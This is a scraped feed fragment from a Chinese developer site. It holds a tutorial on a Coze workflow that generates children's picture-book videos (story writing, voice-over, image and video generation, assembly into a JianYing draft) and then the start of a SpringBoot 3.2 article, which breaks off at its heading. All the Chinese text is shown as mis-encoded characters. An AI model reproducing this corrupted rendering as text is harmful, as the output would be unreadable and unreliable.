<p>æˆ‘è¿›å…¥äº†ä¸€ä¸ªæ•°æ®ä¸é”™çš„åšä¸»ä¸»é¡µçš„æ©±çª—ï¼Œå“ç±»éƒ½æ˜¯å„¿ç«¥ç»˜æœ¬ï¼Œä»–çš„æ•°æ®æŒºä¸é”™ã€‚å…¶å®åˆ°è¿™é‡Œå®Œæ•´ä¸€å¥—å•†ä¸šé€»è¾‘å·²ç»å‘ˆç°ï¼Œå³é€šè¿‡åˆ¶ä½œé«˜è´¨é‡çš„å„¿ç«¥ç»˜æœ¬å›¾æ–‡æˆ–è§†é¢‘å†æŒ‚æ©±çª—ã€‚</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/4b2b230b78824f7f9440627068a247b2~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5ZCO56uv5bCP6IKl6IKg:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766469467&amp;x-signature=rogxurCasw5D64lP6soKeXDBfBw%3D" alt="" loading="lazy"/></p>
<p>ä»Šå¤©è¿™æœŸæ•™ç¨‹å°†æ•™å¤§å®¶ç”¨cozeå·¥ä½œæµä¸€é”®ç”Ÿæˆå„¿ç«¥ç»˜æœ¬è§†é¢‘ï¼Œæ”¯æŒä¸­è‹±æ–‡ï¼Œä½ è¦åšçš„ä»…ä»…æ˜¯<strong>æä¾›ç»˜æœ¬è§†é¢‘ä¸»é¢˜</strong>å’Œ<strong>å°†cozeç”Ÿæˆçš„å‰ªæ˜ è‰ç¨¿å¯¼å‡ºåˆ°å‰ªæ˜ ä¸­</strong>ã€‚</p>
<p><strong>æ•ˆæœæ¼”ç¤ºï¼š</strong></p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/83ca0b4f103a468c9225fb8ecd6f71a5~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5ZCO56uv5bCP6IKl6IKg:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766469467&amp;x-signature=u8tVD0bFx8NjBwjiS0ac5njq7fM%3D" alt="" loading="lazy"/></p>
<p>cozeå·¥ä½œæµçš„ä½¿ç”¨å¾ˆç®€å•ï¼Œæˆ‘ä»¬æ‰¾åˆ°cozeå·¥ä½œæµç•Œé¢ï¼Œç‚¹å‡»ã€è¯•è¿è¡Œã€‘æŒ‰é’®ï¼Œè¾“å…¥ä¸»é¢˜ï¼Œè¯­è¨€ï¼ˆæ”¯æŒzh/enï¼‰ï¼Œä¸Šä¼ èƒŒæ™¯éŸ³ä¹éŸ³ä¹åå†ç‚¹å‡»åº•éƒ¨ã€è¯•è¿è¡Œã€‘æŒ‰é’®ã€‚</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/e6d1e86950df4da98bdf04fa58d15833~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5ZCO56uv5bCP6IKl6IKg:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766469467&amp;x-signature=rWUD6JbK1BbGgawus7uZb8P3tFs%3D" alt="" loading="lazy"/></p>
<p>ç­‰å¾…å‡ åˆ†é’Ÿåå°±ä¼šç”Ÿæˆå‰ªæ˜ è‰ç¨¿é“¾æ¥ã€‚</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/9f1294b6756640a98e9655a0209eefc3~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5ZCO56uv5bCP6IKl6IKg:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766469467&amp;x-signature=j7KYhqbXARTTAb3B%2BoYlgqhhvcQ%3D" alt="" loading="lazy"/></p>
<p>åªéœ€å°†å…¶å¯¼å‡ºè‡³å‰ªæ˜ å³å¯è·å¾—æˆå“è§†é¢‘ï¼Œå¯ä»¥å¾®è°ƒæˆ–ç›´æ¥å¯¼å‡ºä¸Šä¼ åˆ°å¹³å°ã€‚</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/efc1279faaee45b791cdd10ebaad0c10~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5ZCO56uv5bCP6IKl6IKg:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766469467&amp;x-signature=5Q2tQlXiLIJJyJcvVHUNVP6rjIM%3D" alt="" loading="lazy"/></p>
<h2 data-id="heading-1">2. å·¥ä½œæµæ­å»º</h2>
<p>å®Œæ•´å·¥ä½œæµå¦‚ä¸‹å›¾ï¼Œæ•´ä½“å·¥ä½œæµå¹¶ä¸å¤æ‚ï¼Œå·¥ä½œæµçš„è¿è¡Œå¯æ‹†è§£ä¸ºä»¥ä¸‹å‡ æ­¥ï¼š</p>
<ol>
<li>
<p>ç”¨æˆ·è¾“å…¥ä¸»é¢˜ã€ç»˜æœ¬è§†é¢‘è¯­è¨€ï¼ˆzhæˆ–enï¼‰ã€ç”Ÿå›¾æ¨¡å‹ï¼ˆæ”¯æŒè±†åŒ…å’Œnano banana proï¼‰å’Œä¸Šä¼ èƒŒæ™¯éŸ³ä¹</p>
</li>
<li>
<p>å¤§æ¨¡å‹åˆ›ä½œç»˜æœ¬æ•…äº‹å¤§çº²ã€æ•…äº‹ç‰‡æ®µåˆ—è¡¨å’Œä¸»è§’å½¢è±¡</p>
</li>
<li>
<p>è¿›å…¥å¾ªç¯éå†å¯¹æ¯ä¸ªæ•…äº‹ç‰‡æ®µè¿›è¡Œé…éŸ³ã€æ–‡ç”Ÿå›¾ã€å›¾ç”Ÿè§†é¢‘æ“ä½œ</p>
</li>
<li>
<p>é€€å‡ºå¾ªç¯è·å–è§†é¢‘åˆ—è¡¨ã€é…éŸ³åˆ—è¡¨ç­‰è§†é¢‘ç´ æ</p>
</li>
<li>
<p>åŸºäºä»£ç å°†è§†é¢‘ç´ æè½¬æ¢ä¸ºå‰ªæ˜ å°åŠ©æ‰‹æ‰€éœ€æ ¼å¼</p>
</li>
<li>
<p>åˆ›å»ºå‰ªæ˜ è‰ç¨¿</p>
</li>
<li>
<p>å°†è§†é¢‘ç´ ææ·»åŠ åˆ°å‰ªæ˜ è‰ç¨¿å½“ä¸­</p>
</li>
</ol>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/231dea80af654ff783936786b8e5436e~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5ZCO56uv5bCP6IKl6IKg:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766469467&amp;x-signature=FvgsQJORAIVo4NcN1KFyjH8%2BH1o%3D" alt="" loading="lazy"/></p>
<p><strong>å¼€å§‹ï¼š</strong> å¼€å§‹èŠ‚ç‚¹å‚æ•°åŒ…å«èƒŒæ™¯éŸ³ä¹ã€è¯­è¨€ç±»å‹ï¼ˆæ”¯æŒzh/enï¼‰ã€ç”Ÿå›¾æ¨¡å‹ï¼ˆæ”¯æŒè±†åŒ…å’Œnano banana proï¼‰ã€æ•…äº‹ä¸»é¢˜ã€‚</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/34d31a327305452c9b494128a9e888af~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5ZCO56uv5bCP6IKl6IKg:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766469467&amp;x-signature=RJpGjnXA1%2BX5mlzIqp3OiyhUQVY%3D" alt="" loading="lazy"/></p>
<p><strong>å„¿ç«¥æ•…äº‹ï¼ˆ</strong> <strong>å¤§æ¨¡å‹</strong> <strong>ï¼‰ï¼š</strong> å¼€å§‹èŠ‚ç‚¹åæ¥å¤§æ¨¡å‹èŠ‚ç‚¹ï¼Œè¿™ä¸ªèŠ‚ç‚¹çš„ä½œç”¨æ˜¯æ ¹æ®å¼€å§‹èŠ‚ç‚¹ä¼ å…¥çš„æ•…äº‹ä¸»é¢˜å’Œè¯­è¨€ç±»å‹è¿›è¡Œæ•…äº‹åˆ›ä½œï¼Œæœ€åä¼šç”Ÿæˆæ•…äº‹ä¸»è§’å½¢è±¡ã€æ•…äº‹æ¢—æ¦‚ã€æ•…äº‹ç‰‡æ®µåˆ—è¡¨ã€é…éŸ³æ–‡æ¡ˆåˆ—è¡¨ï¼ˆæ ¹æ®è¯­è¨€è‡ªé€‚åº”ä¸ºä¸­æ–‡æˆ–è‹±æ–‡ï¼‰ã€‚</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/2e6343167f674500b6bc70fe2962420a~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5ZCO56uv5bCP6IKl6IKg:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766469467&amp;x-signature=paEHX1GvhHlkvkpz%2BD2vg5cbMTg%3D" alt="" loading="lazy"/></p>
<p><strong>å¾ªç¯ï¼š</strong> å„¿ç«¥æ•…äº‹ï¼ˆå¤§æ¨¡å‹ï¼‰èŠ‚ç‚¹åæ¥å¾ªç¯èŠ‚ç‚¹ï¼Œè¿™ä¸ªèŠ‚ç‚¹çš„ä½œç”¨æ˜¯å¯¹å‰ç½®èŠ‚ç‚¹ç”Ÿæˆçš„æ•…äº‹ç‰‡æ®µåˆ—è¡¨è¿›è¡Œå¾ªç¯éå†ï¼Œåœ¨å¾ªç¯ä¸­é’ˆå¯¹æ¯ä¸ªç‰‡æ®µè¿›è¡Œé…éŸ³ã€æ–‡ç”Ÿå›¾å’Œå›¾ç”Ÿè§†é¢‘æ“ä½œï¼Œæœ€åè·å–è§†é¢‘åˆ—è¡¨ã€é…éŸ³åˆ—è¡¨ç­‰è§†é¢‘ç´ æã€‚</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/79477ed5857c4e77957323ef25b5579d~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5ZCO56uv5bCP6IKl6IKg:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766469467&amp;x-signature=9lhOR%2FFI2kuJjoE6oJzxWOVuKDU%3D" alt="" loading="lazy"/></p>
<p><strong>speech_synthesisï¼š</strong> è¿™æ˜¯ä¸€ä¸ªé…éŸ³æ’ä»¶ï¼Œå®ƒçš„ä½œç”¨æ˜¯å¯¹æ•…äº‹ç‰‡æ®µè¿›è¡Œé…éŸ³ç”Ÿæˆæ“ä½œã€‚</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/5317d454a34c4f838c81fa779f0d8f45~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5ZCO56uv5bCP6IKl6IKg:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766469467&amp;x-signature=UK7VSgw%2FEMc7xNut231SQk%2FEqFQ%3D" alt="" loading="lazy"/></p>
<p><strong>get_audio_durationï¼š</strong> è¿™ä¸ªèŠ‚ç‚¹ä½äºspeech_synthesisåï¼Œå®ƒçš„ä½œç”¨æ˜¯è·å–é…éŸ³ç‰‡æ®µçš„æ—¶é•¿ã€‚</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/0905708725324f58a89b3534c35c1f92~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5ZCO56uv5bCP6IKl6IKg:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766469467&amp;x-signature=e7KMlin3wkpXLlvvtUya24A%2FNzI%3D" alt="" loading="lazy"/></p>
<p><strong>æ–‡ç”Ÿå›¾ï¼š</strong> è¿™æ˜¯ä¸€ä¸ªå¤§æ¨¡å‹èŠ‚ç‚¹ï¼Œå®ƒçš„ä½œç”¨æ˜¯åŸºäºä¸»è§’å½¢è±¡å’Œæ•…äº‹ç‰‡æ®µç”Ÿæˆæ–‡ç”Ÿå›¾æç¤ºè¯ã€‚</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/4b737fdd366649d9a2d20cd460039118~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5ZCO56uv5bCP6IKl6IKg:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766469467&amp;x-signature=K6CYAiWdCN7tWCBCQsSqUzKNlII%3D" alt="" loading="lazy"/></p>
<p><strong>å›¾ç‰‡ç”Ÿæˆï¼š</strong> æ ¹æ®å¼€å§‹èŠ‚ç‚¹çš„ç”Ÿå›¾æ¨¡å‹ï¼Œéœ€è¦ç”¨é€‰æ‹©å™¨èŠ‚ç‚¹åˆ¤æ–­é‡‡ç”¨å“ªç§ç”Ÿå›¾æ¨¡å‹åŸºäº<strong>æ–‡ç”Ÿå›¾æç¤ºè¯</strong>æ¥ç”Ÿæˆå›¾ç‰‡ã€‚</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/c6b8e852ac9f46b2b82e5843ff9f8585~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5ZCO56uv5bCP6IKl6IKg:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766469467&amp;x-signature=aoMSB0jeqe2JMy1m%2BKdZ9%2BFeKFQ%3D" alt="" loading="lazy"/></p>
<p><strong>å›¾ç”Ÿè§†é¢‘ï¼ˆ</strong> <strong>å¤§æ¨¡å‹</strong> <strong>ï¼‰ï¼š</strong> å›¾ç‰‡ç”Ÿæˆåå°±éœ€è¦è¿›è¡Œè§†é¢‘ç”Ÿæˆæ“ä½œï¼Œè¿™ä¸ªèŠ‚ç‚¹çš„ä½œç”¨æ˜¯æ ¹æ®å‰ç½®çš„<strong>æ–‡ç”Ÿå›¾æç¤ºè¯</strong>å’Œ<strong>æ•…äº‹ç‰‡æ®µ</strong>ç”Ÿæˆ<strong>å›¾ç”Ÿè§†é¢‘æç¤ºè¯</strong>ã€‚</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/6146418c9ae4429daaaee3325a445105~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5ZCO56uv5bCP6IKl6IKg:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766469467&amp;x-signature=XX%2BGuTLPE2WriO8vfa2fgugkhUU%3D" alt="" loading="lazy"/></p>
<p><strong>è§†é¢‘ç”Ÿæˆï¼š</strong> è¿™æ˜¯ä¸€ä¸ªå­å·¥ä½œæµï¼Œå®ƒçš„ä½œç”¨æ˜¯åŸºäºå‰ç½®çš„<strong>å›¾ç‰‡</strong>å’Œ<strong>å›¾ç”Ÿè§†é¢‘æç¤ºè¯</strong>è¿›è¡Œè§†é¢‘ç”Ÿæˆæ“ä½œã€‚</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/e611e6cb1bbd467eb43c4563d51c66be~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5ZCO56uv5bCP6IKl6IKg:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766469467&amp;x-signature=PYLboCwbikxUz%2Bb0xHPGskk5CyI%3D" alt="" loading="lazy"/></p>
<p>è¿™ä¸ªå·¥ä½œæµåŸºäºcomfyuiè¿›è¡Œè§†é¢‘ç”Ÿæˆæ“ä½œï¼Œè¯¦æƒ…å¯çœ‹<a href="https://juejin.cn/post/7539938717806575662" target="_blank" title="https://juejin.cn/post/7539938717806575662">Coze+ComfyUI å®æˆ˜ï¼šè§†é¢‘åˆ¶ä½œæˆæœ¬é™10 å€ï¼Œé«˜è´¨é‡æˆç‰‡è¿™ä¹ˆåš</a>ã€‚</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/0ca429c9feb9457ca0ded7c02e533fed~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5ZCO56uv5bCP6IKl6IKg:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766469467&amp;x-signature=EV5fCIglv7kjij9wPzei2RSHkUk%3D" alt="" loading="lazy"/></p>
<p><strong>ä»£ç ä¿¡æ¯ç»„è£…ï¼š</strong> å¾ªç¯ç»“æŸåè·å¾—äº†è§†é¢‘åˆ—è¡¨ã€é…éŸ³åˆ—è¡¨ç­‰è§†é¢‘ç´ æï¼Œéœ€è¦ç”¨ä¸€ä¸ªä»£ç èŠ‚ç‚¹æ¥å°†è¿™äº›ç´ æç»„è£…ä¸ºå‰ªæ˜ å°åŠ©æ‰‹éœ€è¦çš„æ ¼å¼ã€‚</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/a87339924a8542848556fe821f6ba4fd~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5ZCO56uv5bCP6IKl6IKg:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766469467&amp;x-signature=erWjTuiRYNEgKWdH1aCC9cZ1%2FOc%3D" alt="" loading="lazy"/></p>
<p><strong>å‰ªæ˜ ç´ ææ·»åŠ ï¼š</strong> ç´ æç»„è£…å®Œæˆåå°±å¯ä»¥è¿›è¡Œ<strong>å°†ç´ ææ·»åŠ åˆ°å‰ªæ˜ è‰ç¨¿</strong>çš„æ“ä½œäº†ã€‚ä¸‹å›¾è¿›è¡Œäº†è‰ç¨¿åˆ›å»ºï¼Œæ·»åŠ è§£è¯´äººå£°ã€æ·»åŠ èƒŒæ™¯éŸ³ä¹ã€æ·»åŠ è§†é¢‘ã€æ·»åŠ å­—å¹•ã€ä¿å­˜è‰ç¨¿çš„æ“ä½œã€‚</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/035fcdd0c07b42d28a6572a8f2134752~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5ZCO56uv5bCP6IKl6IKg:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766469467&amp;x-signature=Sl%2FrJlZX0BemTPEEymCQSxISl1M%3D" alt="" loading="lazy"/></p>
<p><strong>ç»“æŸï¼š</strong> ç»“æŸèŠ‚ç‚¹åªéœ€è¦è·å–æœ€ç»ˆçš„è‰ç¨¿åœ°å€å³å¯ã€‚</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/f959f49e197c49038e8fd30e10acb62b~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5ZCO56uv5bCP6IKl6IKg:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766469467&amp;x-signature=AggaheUgSZakgpDWkii6i3PZR4U%3D" alt="" loading="lazy"/></p>
<p>ä»¥ä¸Šå°±æ˜¯æ•´ä¸ªå·¥ä½œæµçš„å®Œæ•´æµç¨‹æ‹†è§£ï¼ŒåŠ¨æ‰‹èƒ½åŠ›å¼ºçš„è¯»è€…å¯ä»¥è·Ÿç€æ•™ç¨‹å®è·µä¸€éã€‚<strong>ä¸Šè¿°å·¥ä½œæµå·²ç»è¢«æ”¶å½•åˆ°äº†å°è‚¥è‚ å…±å­¦ç¾¤ä¸­ï¼Œå¦‚æœæƒ³ç›´æ¥è·å–å·¥ä½œæµåŸä»¶ï¼Œå¯ä»¥åŠ å…¥ç¤¾ç¾¤åæˆ‘æ‹‰ä½ è¿›ç©ºé—´ç›´æ¥å­¦ä¹ ä½¿ç”¨ã€‚</strong></p>
<h2 data-id="heading-2">3. ç»“è¯­</h2>
<p>ä»åˆ›æ„æ„æ€åˆ°æˆå“è§†é¢‘ï¼Œè¿‡å»å¯èƒ½éœ€è¦å‡ å¤©çš„æ—¶é—´ï¼Œç°åœ¨é€šè¿‡è¿™å¥— Coze å·¥ä½œæµï¼Œå‡ åˆ†é’Ÿå†…å³å¯å®Œæˆä» 0 åˆ° 1 çš„è‡ªåŠ¨åŒ–é—­ç¯ã€‚è¿™ä¸ä»…æ˜¯ä¸€ä¸ªæŠ€æœ¯çš„å±•ç¤ºï¼Œæ›´æ˜¯ä¸€æ¬¡<strong>ç”Ÿäº§åŠ›çš„è§£æ”¾</strong>ã€‚æˆ‘ä»¬å°†ç¹ççš„é‡å¤åŠ³åŠ¨äº¤ç»™ AIï¼Œå°†ç²¾åŠ›é›†ä¸­åœ¨æ›´æœ‰ä»·å€¼çš„<strong>é€‰é¢˜ç­–åˆ’</strong>ä¸IPè¿è¥ä¸Šã€‚</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/2daf2c8065e0465bb4cf5ae3ce708442~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5ZCO56uv5bCP6IKl6IKg:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766469467&amp;x-signature=e13bSBFDD6cjCkHAJZu3H3sUngo%3D" alt="" loading="lazy"/></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[SpringBoot 3.2 å®æˆ˜ï¼šç”¨è¿™5ä¸ªæ–°ç‰¹æ€§è®©ä½ çš„APIæ€§èƒ½æå‡40%]]></title>    <link>https://juejin.cn/post/7583973613197656079</link>    <guid>https://juejin.cn/post/7583973613197656079</guid>    <pubDate>2025-12-16T04:16:54.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7583973613197656079" data-draft-id="7583973472323502095" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="SpringBoot 3.2 å®æˆ˜ï¼šç”¨è¿™5ä¸ªæ–°ç‰¹æ€§è®©ä½ çš„APIæ€§èƒ½æå‡40%"/> <meta itemprop="keywords" content="åç«¯,å‰ç«¯,äººå·¥æ™ºèƒ½"/> <meta itemprop="datePublished" content="2025-12-16T04:16:54.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="é˜¿æ©™çš„ç™¾å®ç®±"/> <meta itemprop="url" content="https://juejin.cn/user/1638743356481367"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            SpringBoot 3.2 å®æˆ˜ï¼šç”¨è¿™5ä¸ªæ–°ç‰¹æ€§è®©ä½ çš„APIæ€§èƒ½æå‡40%
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1638743356481367/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    é˜¿æ©™çš„ç™¾å®ç®±
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-16T04:16:54.000Z" title="Tue Dec 16 2025 04:16:54 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-16
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»1åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0"><strong>SpringBoot 3.2 å®æˆ˜ï¼šç”¨è¿™5ä¸ªæ–°ç‰¹æ€§è®©ä½ çš„APIæ€§èƒ½æå‡40%</strong></h2>
<h2 data-id="heading-1">å¼•è¨€</h2>
